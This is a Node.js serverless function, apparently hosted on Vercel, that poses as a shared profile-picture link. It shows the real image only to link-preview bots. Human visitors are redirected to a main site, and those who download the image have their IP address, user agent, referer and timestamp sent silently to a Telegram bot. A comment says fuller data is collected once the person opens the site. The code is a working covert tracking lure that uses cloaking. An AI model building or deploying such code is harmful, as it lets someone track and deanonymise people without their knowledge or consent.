const fs = require('fs');
const path = require('path');

const IMAGE_PATH = path.join(__dirname, 'pfp-data.jpg');

function getHomeUrl() {
    const host =
        process.env.VERCEL_PROJECT_PRODUCTION_URL ||
        process.env.VERCEL_URL ||
        '';
    if (!host) return 'https://crazy-psycho.vercel.app/';
    return `https://${host.replace(/^https?:\/\//, '')}/`;
}

function esc(value) {
    if (!value) return '—';
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

async function notifyTelegramServer(action, req) {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) return;

    const ip =
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        '—';
    const ua = req.headers['user-agent'] || '—';
    const referer = req.headers.referer || req.headers.referrer || '—';

    const labels = {
        image_download: '📥 <b>Image téléchargée</b>',
        image_open: '🖼️ <b>Accès direct image</b>'
    };

    const text =
        (labels[action] || '📥 <b>Image</b>') +
        '\n\n' +
        `<b>Action:</b> ${esc(action)}\n` +
        `<b>IP:</b> ${esc(ip)}\n` +
        `<b>Referer:</b> ${esc(referer)}\n` +
        `<b>User-Agent:</b> ${esc(ua.slice(0, 200))}\n` +
        `<b>Heure:</b> ${esc(new Date().toISOString())}\n` +
        '\n<i>Données complètes si la personne ouvre le site.</i>';

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
    } catch {
        /* silencieux */
    }
}

module.exports = async (req, res) => {
    const ua = req.headers['user-agent'] || '';
    const isPreviewBot = /discordbot|facebookexternalhit|twitterbot|whatsapp|telegrambot/i.test(ua);
    const isDownload = req.url && req.url.includes('download=1');

    if (!isPreviewBot && isDownload) {
        await notifyTelegramServer('image_download', req);
        try {
            const image = fs.readFileSync(IMAGE_PATH);
            res.setHeader('Content-Type', 'image/jpeg');
            res.setHeader('Content-Disposition', 'attachment; filename="pfp.jpg"');
            res.setHeader('Cache-Control', 'no-store');
            return res.end(image);
        } catch {
            return res.status(404).json({ error: 'Image introuvable' });
        }
    }

    if (!isPreviewBot) {
        const home = getHomeUrl();
        res.writeHead(302, { Location: `${home}?from=image` });
        return res.end();
    }

    try {
        const image = fs.readFileSync(IMAGE_PATH);
        res.setHeader('Content-Type', 'image/jpeg');
        res.setHeader('Cache-Control', 'public, max-age=86400');
        return res.end(image);
    } catch {
        return res.status(404).json({ error: 'Image introuvable' });
    }
};
